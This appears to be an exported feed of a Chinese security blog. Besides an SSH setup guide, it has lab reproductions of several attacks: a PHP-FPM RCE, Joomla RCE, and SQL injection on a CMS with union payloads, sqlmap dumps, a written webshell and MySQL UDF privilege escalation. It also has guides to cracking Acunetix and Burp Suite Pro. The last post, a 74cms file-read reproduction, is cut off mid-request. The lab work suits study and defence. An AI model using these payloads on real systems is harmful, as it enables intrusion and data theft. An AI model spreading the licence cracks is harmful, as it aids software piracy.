class="language-bash"><span class="token function">netstat</span> -ntl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用修改后的端口连接ssh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -p <span class="token number">2233</span> root@127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果无误，将前面的Port 22注释掉</p><h4 id="配置免密登录"><a href="#配置免密登录" class="headerlink" title="配置免密登录"></a>配置免密登录</h4><h5 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen -t rsa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/03/06/rKNmMd3SO1iITXb.png"></p><p>按提示输入即可（也可一直回车使用空密码）</p><p>公钥文件存储在C:\Users\15627.ssh\id_rsa.pub</p><h5 id="将密钥上传至服务器"><a href="#将密钥上传至服务器" class="headerlink" title="将密钥上传至服务器"></a>将密钥上传至服务器</h5><p>Linux下可直接使用ssh-copy-id</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">语法ssh-copy-id <span class="token punctuation">[</span>-i <span class="token punctuation">[</span>identity_file<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>user@<span class="token punctuation">]</span>machine例子ssh-copy-id -i ~/.ssh/id_rsa.pub root@127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/03/06/TSQKWMfOhbw9Fn5.png"></p><p>Windows下目前没有自带ssh-copy-id，可使用scp</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">语法<span class="token function">scp</span> <span class="token punctuation">[</span>参数<span class="token punctuation">]</span> <span class="token punctuation">[</span>原路径<span class="token punctuation">]</span> <span class="token punctuation">[</span>目标路径<span class="token punctuation">]</span>例子<span class="token function">scp</span> C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>usernmae<span class="token punctuation">\</span>.ssh<span class="token punctuation">\</span>id_rsa.pub root@127.0.0.1:~/.ssh/win.pub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/03/06/LtNS9aPdEY7B3vs.png"></p><p>然后使用ssh连接服务器将win.pub添加至authorized_keys</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /root/.ssh <span class="token operator">&amp;&amp;</span> <span class="token function">cat</span> win.pub <span class="token operator">>></span> authorized_keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可免密登录vps</p><h5 id="配置第三方软件免密登录"><a href="#配置第三方软件免密登录" class="headerlink" title="配置第三方软件免密登录"></a>配置第三方软件免密登录</h5><p><a href="https://www.netsarang.com/zh/xshell/">Xshell</a></p><p>菜单栏→工具→用户密钥管理者</p><p><img src="https://i.loli.net/2020/03/06/yAWoQBiHdCfUpF7.png"></p><p>在用户密钥处导入id_rsa</p><p><img src="https://i.loli.net/2020/03/06/IupVstZ5hENKW8R.png"></p><p>在用户身份验证中，方法选择Public Key，密钥选择刚导入的id_rsa即可</p><p><img src="https://i.loli.net/2020/03/06/YWtmJD1qTL6zNid.png"></p><p><a href="https://termius.com/">Termius</a></p><p>菜单栏→Keychain</p><p><img src="https://i.loli.net/2020/03/06/CtAB6rNzFJdgMD5.png"></p><p>在Keychain里选择NEW KEY，在Add Key的Label*处取个名，在Private Key*点击File导入id_rsa并保存</p><p><img src="https://i.loli.net/2020/03/06/kwb2YNRlATGWexU.png"></p><p>在连接设置里选择刚导入的key即可</p><p><img src="https://i.loli.net/2020/03/06/qcxwvZa4dhIWpso.png"></p><h4 id="安装V2ray"><a href="#安装V2ray" class="headerlink" title="安装V2ray"></a>安装V2ray</h4><p>具体参考</p><p><a href="https://github.com/233boy/v2ray/wiki/V2Ray%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85%E8%84%9A%E6%9C%AC">V2Ray一键安装脚本</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>acunetix_13.0.200205121安装与破解</title>
      <link href="/archives/41a0b815/"/>
      <url>/archives/41a0b815/</url>
      
        <content type="html"><![CDATA[<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="/misc/">acunetix_13.0.200205121.zip</a></p><p>包含acunetix_13.0.200205121.exe，license_info.json，wvsc.exe以及安装说明.txt</p><p>SHA1：DEDF04A16B6A61174072A2DE5372DBB2CCD045B9</p><p>MD5：7F6A60A04C8D936E49690C43EA1C93CE</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>运行acunetix_13.0.200205121.exe安装awvs13</p><p><img src="https://i.loli.net/2020/02/18/ROPVMuGzKTyr1Aj.png"></p><p>复制wvsc.exe到“C:\Program Files (x86)\Acunetix\13.0.200205121\”下覆盖同名文件（如果安装时修改了安装路径，请更改为修改后的路径）</p><p><img src="https://i.loli.net/2020/02/18/v5C4ekYT7638ynJ.png"></p><p>复制license_info.json到“C:\ProgramData\Acunetix\shared\license”下覆盖同名文件</p><p><img src="https://i.loli.net/2020/02/18/rgvB9Z81dOKuPTC.png"></p><p>如果没有C:\ProgramData目录，请打开显示隐藏项目</p><p><img src="https://i.loli.net/2020/02/18/WLOXEoyiCmYTRqn.png"></p><p>可禁用Acunetix和Acunetix Database这两个服务，让awvs不开机自启，想使用是再启用即可（win10可直接在任务管理器启动服务）</p><p><img src="https://i.loli.net/2020/02/18/p95nrJmPxh1ikuF.png"></p><h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><p><img src="https://i.loli.net/2020/02/18/wNFGX71nSlILhT9.png"></p>]]></content>
      
      
      <categories>
          
          <category> 资源分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资源分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp Suite v2020.9.2的汉化以及无cmd框启动</title>
      <link href="/archives/38a7a949/"/>
      <url>/archives/38a7a949/</url>
      
        <content type="html"><![CDATA[<h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><h2 id="主要更新日志"><a href="#主要更新日志" class="headerlink" title="主要更新日志"></a>主要更新日志</h2><p>V2020.9.2（2020.10.02）</p><p>Burp Scanner支持处理更复杂的登录过程，可配合<a href="https://chrome.google.com/webstore/detail/burp-suite-navigation-rec/anpapjclbjicacakeoggghfldppbkepg">Burp Suite Navigation Recorder</a>浏览器插件录制复杂的登录过程</p><p>Burp Collaborator客户端支持清除交互历史</p><p>修复目标主机名包含下划线时，TLS握手失败的问题；粘贴HTTP请求时，所有内容都可正确显示；解决了Collaborator服务器中的一个安全问题</p><p>V2020.9.1（2020.09.04）</p><p>修复 WebSocket 信息无法正常显示的问题</p><p>V2020.9（2020.09.03）</p><p>对HTTP编辑器界面进行了优化，增加了三个布局，如下图</p><p><img src="https://i.loli.net/2020/09/04/3ATm68r9ligNIbX.jpg"></p><p>内置浏览器更新至Chromium 85.0.4183.83，已更新对应翻译</p><p>V2020.8（2020.08.06）</p><p>新增对网页缓存中毒扫描检查，以及其他一些小的改进和错误修复</p><p>V2020.7（2020.07.20）</p><p>内置chromium浏览器，可直接使用内置浏览器抓包，已更新部分翻译</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>BurpSuite2.0.11beta后的的破解版方法来源于四叔</p><p><a href="http://scz.617.cn:8/misc/201910151519.txt">http://scz.617.cn:8/misc/201910151519.txt</a></p><p><a href="https://www.52pojie.cn/thread-1038295-1-1.html">https://www.52pojie.cn/thread-1038295-1-1.html</a></p><p>四叔已经不在破解后续版本了</p><blockquote><p>2020-04-28 17:23</p><p>有人提供了Burp Pro 2020.4原包，要求最低Java 9，不再支持Java 8。实际测试<br>Java 8确实不行，去官网看了一下说明，官方声明也是这个意思。出于好奇心，最后<br>看了一次其注册机制，没啥变化，可剁。我主要使用Java 8，并非Burp用户，能在这<br>半年来坚持更新破解，算是为大伙儿尽一点小小的心意。本来，如果它还支持Java 8，<br>我就继续剁下去。不想为这事再装Java 9，确实累了，另一方面也对之失去兴趣，没<br>有挑战性。据我所知，很多人延着我的思路在自己剁，也剁成功了。或许你们可以等<br>待新的雷锋，冥冥中另一些路见不平的老中医已经在路上。</p><p>正式决定不再从事Burp破解，微信订阅号后台也不再接受Burp原包。今天有ID为火锅<br>爹、Mannix的两位在微信订阅号后台提供了2020.4版原包，感谢并抱歉，未能最后一<br>次提供传说中的burp-loader-keygen-2020_4.jar。</p><p>感谢过往所有在微信订阅号后台提供过原包的朋友，再次向所有”永远充满好奇心的<br>人们”致敬。</p><p>今天是一个有些伤感的日子，但不再留恋，再见。</p></blockquote><p>后续版本的破解来源于</p><p><a href="https://github.com/x-Ai/BurpSuiteLoader">https://github.com/x-Ai/BurpSuiteLoader</a></p><p>需要 java 9-14  <a href="https://www.oracle.com/java/technologies/javase-jdk14-downloads.html">java14下载</a></p><p>支持 BurpSuite v2020.1及以后的所有版本（只要注册机制不改变）</p><p>以下是我打包的版本（包括<a href="https://www.oracle.com/java/technologies/javase-jdk11-downloads.html">jdk-11.0.8-windows-x64</a>，<a href="http://www.mediafire.com/file/j5y1olh5yp7bf3a/burpsuite_pro_v2020.9.2.jar/file">原版jar</a>，<a href="https://github.com/x-Ai/BurpSuiteLoader">BurpSuiteLoader</a>，图标，<a href="https://github.com/hackxx/BurpSuiteCn">汉化包</a>及翻译文件，启动的vbs，<a href="https://www.jython.org/">jython</a>，<a href="https://github.com/TheKingOfDuck/burpFakeIP">fakeIP</a>，<a href="https://github.com/pmiaowu/BurpShiroPassiveScan">BurpShiroPassiveScan</a>，<a href="https://github.com/bit4woo/knife">knife</a>等插件）</p><p><a href="https://pan.baidu.com/s/1y_ndlZF2oGPUheQDnxUbeA">Burp_Suite_Pro_v2020.9.2.zip</a>  提取码: miku</p><table><thead><tr><th align="left">算法</th><th>哈希值</th></tr></thead><tbody><tr><td align="left">SHA256</td><td>339F3A3677D031EC3061B3C55B08154DCB952CE8DA99E7EF264E3F3021CB6EEE</td></tr><tr><td align="left">MD5</td><td>37954D3204791937ADF234E05F16ACAD</td></tr></tbody></table><p>burpsuite_pro_v2020.9.2.jar（来自nszy007）</p><table><thead><tr><th>算法</th><th>哈希值</th></tr></thead><tbody><tr><td>SHA256</td><td>E208E249635AFCD25FCD86F732C818751D859EAABA8371FF5B98A862A6389A20</td></tr><tr><td>MD5</td><td>CB8DA0399DAE59F32E7E54292C851FF9</td></tr></tbody></table><p><a href="https://portswigger.net/burp/releases">官网</a></p><p><img src="https://i.loli.net/2020/10/09/oZDIae29inxz63L.png"></p><p>第一次破解启动需要使用burp-loader-keygen-2020_2_1.jar完成注册流程</p><p><a href="http://scz.617.cn/private/burp-loader-keygen-2020_2_1.jar_568321911fea077bc290bd9914b73402">burp-loader-keygen-2020_2_1.jar</a></p><table><thead><tr><th>算法</th><th>哈希值</th></tr></thead><tbody><tr><td>SHA256</td><td>74893842A782238F52F0F225C06FA744568321911FEA077BC290BD9914B73402</td></tr><tr><td>MD5</td><td>E646B3EEF03EFBA637E6ED794CED4114</td></tr></tbody></table><p>原版启动的bat为</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">java -noverify -javaagent:BurpSuiteLoader.jar -jar burpsuite_pro_v2020.9.2.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加载汉化包即可汉化</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">java -noverify -javaagent:BurpSuiteLoader.jar -Dfile.encoding&#x3D;utf-8 -javaagent:BurpSuiteChs.jar -jar burpsuite_pro_v2020.9.2.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="无cmd框启动"><a href="#无cmd框启动" class="headerlink" title="无cmd框启动"></a>无cmd框启动</h2><p>使用vbs脚本即可</p><pre class="line-numbers language-vbscript" data-language="vbscript"><code class="language-vbscript">CreateObject(&quot;WScript.Shell&quot;).Run &quot;.\jdk-11.0.8&#x2F;bin&#x2F;java.exe -noverify -javaagent:BurpSuiteLoader.jar -javaagent:BurpSuiteCn.jar -Dfile.encoding&#x3D;utf-8 -jar burpsuite_pro_v2020.9.2.jar&quot;,0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="创建桌面图标"><a href="#创建桌面图标" class="headerlink" title="创建桌面图标"></a>创建桌面图标</h2><p>桌面右键，新建快捷方式，指定vbs脚本，然后更改图标即可</p><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p>桌面图标</p><p><img src="https://i.loli.net/2019/12/02/dpcsBjo9NyPVnLO.png"></p><p>最终效果</p><p><img src="https://i.loli.net/2020/10/09/RT4hotsKQqabCXI.png"></p>]]></content>
      
      
      <categories>
          
          <category> 资源分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资源分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-11043复现</title>
      <link href="/archives/78f531e0/"/>
      <url>/archives/78f531e0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。</p><p>在长亭科技举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。</p><p>在使用一些有错误的Nginx配置的情况下，通过恶意构造的数据包，即可让PHP-FPM执行任意代码。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里直接使用p牛的docker环境进行复现</p><p><a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md">PHP-FPM 远程代码执行漏洞（CVE-2019-11043）</a></p><h6 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> docker docker-compose <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/vulhub/vulhub.git<span class="token builtin class-name">cd</span> vulhub/php/CVE-2019-11043docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在启动环境前建议先设置镜像加速</p><p>在 /etc/docker/daemon.json 写入以下内容（如果不存在文件，请新建）</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"registry-mirrors"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"https://registry.docker-cn.com"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以上是添加 docker 官方提供的中国镜像，也可以选择使用阿里云，中科大等镜像。添加镜像后需要重启docker</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload<span class="token function">sudo</span> systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/29/jR5z9rEof6Jvsgh.png"></p><p>看到上面的界面代表环境启动成功，默认页面在<a href="http://127.0.0.1:8080/index.php">http://127.0.0.1:8080/index.php</a></p><p><img src="https://i.loli.net/2019/10/29/YTiLtIS8RGwcuzP.png"></p><h6 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h6><p>安装golang，git代码并编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> golang<span class="token function">git</span> clone https://github.com/neex/phuip-fpizdam.git<span class="token builtin class-name">cd</span> phuip-fpizdamgo get -vgo build<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/29/q1FviSD6Jn2mLfj.png"></p><p>运行</p><pre class="line-numbers language-none"><code class="language-none">go run . &quot;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.php&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/29/TFlHUvW5hXAfCrB.png"></p><p>验证</p><p><img src="https://i.loli.net/2019/10/29/DsackPLWy9COMoE.png"></p><p>因为php-fpm会启动多个子进程，在访问<code>/index.php?a=id</code>时需要多访问几次，以访问到被污染的进程 </p><p>复现完后建议删除或停止容器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker <span class="token function">ps</span> //查看正在运行容器 docker stop containerId //containerId是容器的ID docker <span class="token function">ps</span> -a //查看所有容器 docker <span class="token function">ps</span> -a -q //查看所有容器ID docker stop <span class="token variable"><span class="token variable">$(</span>docker <span class="token function">ps</span> -a -q<span class="token variable">)</span></span> //停止所有容器 docker <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span>docker <span class="token function">ps</span> -a -q<span class="token variable">)</span></span> //删除所有容器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入以及UDF提权</title>
      <link href="/archives/27651eb5/"/>
      <url>/archives/27651eb5/</url>
      
        <content type="html"><![CDATA[<p><strong>熊海CMS的SQL注入以及后续的UDF提权</strong><span id="more"></span></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>后台登录界面存在sql注入，可抓包后放到sqlmap跑<img src="https://i.loli.net/2019/10/28/EQmeRBvlMpLbo9a.png"></p><p>可获取到管理员密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -r <span class="token number">1</span>.txt -D isea -T manage -C name,password --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/OcJSzXi1tBlGWf9.png"></p><p>登陆到后台后还存在union联合注入</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//10.1.1.11/admin/?r=editcolumn&amp;type=1&amp;id=1' and 1=2 union select 1,2,3,4,5,6,7,8,9,10--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/JpGQmZsozfcMS4j.png"></p><p>构造注入语句</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//10.1.1.11/admin/?r=editcolumn&amp;type=1&amp;id=1' and 1=2 union select 1,version(),user(),@@datadir,5,database(),7,password,9,10 from manage--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/afdbNP5roHG7jwU.png"></p><h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>通过sqlmap读取配置文件获取网站绝对路径</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">sqlmap -r 1.txt --file-read /etc/httpd/conf/httpd.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/kiuISv2Kxoc9Mnr.png"></p><p>也可构造load_file()读取文件</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//10.1.1.11/admin/?r=editcolumn&amp;type=1&amp;id=1' and 1=2 union select 1,2,3,4,5,6,7,load_file('/etc/httpd/conf/httpd.conf'),9,10--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/UQXgjxoNWD14e8f.png"></p><h6 id="获取到绝对路径后可以使用sqlmap获取os-shell"><a href="#获取到绝对路径后可以使用sqlmap获取os-shell" class="headerlink" title="获取到绝对路径后可以使用sqlmap获取os-shell"></a>获取到绝对路径后可以使用sqlmap获取os-shell</h6><p>PS:获取到绝对路径后并没根目录的权限，但子目录有权限</p><p><img src="https://i.loli.net/2019/10/28/VhPavUCYJzTDp1O.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -r <span class="token number">1</span>.txt --os-shell     <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/KjVMJHvdeyq13Fz.png"></p><p>输入网站类型和路径，即可获取os-shell</p><p><img src="https://i.loli.net/2019/10/28/WAbHmzN1dcyGYwa.png"></p><p>sqlmap会上传两个页面，前者为文件上传，后者为命令执行执行</p><p><img src="https://i.loli.net/2019/10/28/YfMyDHwOKrIG4Z3.png" alt="前者"></p><p><img src="https://i.loli.net/2019/10/28/IQHG2kfqnND18Wm.png" alt="后者"></p><p>可以利用文件上传页面上传其他shell，获得更好的体验</p><h6 id="或者构造into-outfile写shell"><a href="#或者构造into-outfile写shell" class="headerlink" title="或者构造into outfile写shell"></a>或者构造into outfile写shell</h6><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//10.1.1.11/admin/?r=editcolumn&amp;type=1&amp;id=1' and 1=2 union select 1,2,3,4,5,6,7,8,'&lt;?php phpinfo();?>',10 into outfile '/var/www/html/xcxmiku/images/xcx.php'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/4MOEnLU1o28DNZB.png"></p><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>此时shell的权限为 apache <img src="https://i.loli.net/2019/10/28/sNPFq6QWzpvMykT.png"></p><p>使用UDF提权可将将MYSQL账号root转化为系统system权限，从而执行系统任意命令 </p><h6 id="UDF获取"><a href="#UDF获取" class="headerlink" title="UDF获取"></a>UDF获取</h6><p>在msf的/usr/share/metasploit-framework/data/exploits/mysql目录下</p><p><img src="https://i.loli.net/2019/10/28/wJteD3chuvo2mYC.png"></p><p>也可在<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">github</a>上获取</p><p>dll对应Windows，so对应Linux</p><p>使用sqlmap –sql-shell 获取 mysql root密码</p><p>5.6及以下版本执行</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select host,user,password from mysql.user;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5.7及以上版本执行</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select host,user,authentication_string from mysql.user;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/Bik34rAhfHEOuTw.png"></p><p>我这里为空密码</p><p>使用蚁剑连接数据库获取必要信息</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select @@version_compile_machine,@@plugin_dir;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/upzlc9hDC1bw5UV.png"></p><p>操作系统为64位，Plugin文件夹 在/usr/lib64/mysql/plugin</p><h6 id="UDF上传"><a href="#UDF上传" class="headerlink" title="UDF上传"></a>UDF上传</h6><p>使用蚁剑将 lib_mysqludf_sys_64.so 上传至 /usr/lib64/mysql/plugin</p><p><img src="https://i.loli.net/2019/10/28/qpBoUnaY63bMg5L.png"></p><p>安装UDF</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">create function sys_eval returns string soname &#39;lib_mysqludf_sys_64.so&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/ea6oKxGQXcYlkb1.png"></p><p>这里我们选择sys_eval函数，此函数可执行系统命令并回显</p><p>验证</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from mysql.func where name &#x3D; &#39;sys_eval&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/E2xOmUy1vaWu3VY.png"></p><p>利用</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select sys_eval(&#39;whoami&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/XKLWDGoQNv9EH5a.png"></p><p>通过sys_eval即可执行任意系统命令</p><p>PS: 记得用完删除文件和udf定义，删除语句为drop function sys_eval;</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Joomla3.4.6-RCE漏洞复现</title>
      <link href="/archives/604d2f58/"/>
      <url>/archives/604d2f58/</url>
      
        <content type="html"><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>源码下载地址</p><p><a href="https://github.com/joomla/joomla-cms/releases/tag/3.4.6">https://github.com/joomla/joomla-cms/releases/tag/3.4.6</a><br><a href="https://downloads.joomla.org/it/cms/joomla3/3-4-6">https://downloads.joomla.org/it/cms/joomla3/3-4-6</a> </p><p> 我这边直接使用了phpstudy</p><p><img src="https://i.loli.net/2019/10/23/Kmkp3qgMayu6rZf.png"> </p><p><img src="https://i.loli.net/2019/10/23/gcO72WNJht5eRBT.png"></p><p>这里需要提前新建数据库，然后直接安装即可。</p><p><img src="https://i.loli.net/2019/10/23/C9WxVTsIi7Pjop3.png"></p><p> 安装完成后的默认后台地址为</p><p><a href="http://127.0.0.1/joomla/administrator/">http://127.0.0.1/joomla/administrator/</a></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>POC在这里</p><p><a href="https://github.com/kiks7/rusty_joomla_rce">https://github.com/kiks7/rusty_joomla_rce</a></p><h6 id="使用python进行漏洞检测"><a href="#使用python进行漏洞检测" class="headerlink" title="使用python进行漏洞检测"></a>使用python进行漏洞检测</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python rusty_joomla_exploit.py -t http://10.1.1.11/joomla/ -c   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/23/tOe7n5WLQy8UP6i.png"></p><h6 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h6><p><img src="https://i.loli.net/2019/10/23/HXMYL6n7WOueD5A.png"></p><p>反弹shell失败，但是在 configuration.php 写入了一句话木马，使用蚁剑连接</p><p><img src="https://i.loli.net/2019/10/23/Ns2j8I1Rbh4SAdT.png"></p><p>可getshell</p><h6 id="使用msf进行漏洞检测"><a href="#使用msf进行漏洞检测" class="headerlink" title="使用msf进行漏洞检测"></a>使用msf进行漏洞检测</h6><p>将metasploit_rusty_joomla_rce放到/usr/share/metasploit-framework/modules/exploits/multi/php/</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> metasploit_rusty_joomla_rce.rb /usr/share/metasploit-framework/modules/exploits/multi/php/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后在 msfconsole 里 reload_all 再搜索 joomla </p><p><img src="https://i.loli.net/2019/10/23/5OosHyXm6iJVrkw.png"></p><p>选择模块并查看参数</p><p><img src="https://i.loli.net/2019/10/23/Kd4JqNcDm9fY1jM.png"></p><p>设置参数进行攻击</p><p><img src="https://i.loli.net/2019/10/23/KwhXSxFQZukpLGO.png"></p><p>还需设set verbose true</p><p><img src="https://i.loli.net/2019/10/23/m8uAOQiI9sYyLWN.png"></p><p>能获取到漏洞所需要的信息，但却还是利用失败，原因未知。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>74cms v4.2.3任意文件读取</title>
      <link href="/archives/b5945507/"/>
      <url>/archives/b5945507/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于漏洞的分析请看这篇文章<a href="https://balis0ng.com/post/dai-ma-shen-ji/2017-07-05">74cms v4.2.3前台任意文件读取</a>，大佬分析的很详细，我这里不作分析，仅复现漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先尝试读取 db.php，向服务器post如下数据</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/index.php?m=&amp;c=members&amp;a=register</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header-name keyword">Host:</span> 10.1.1.1<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 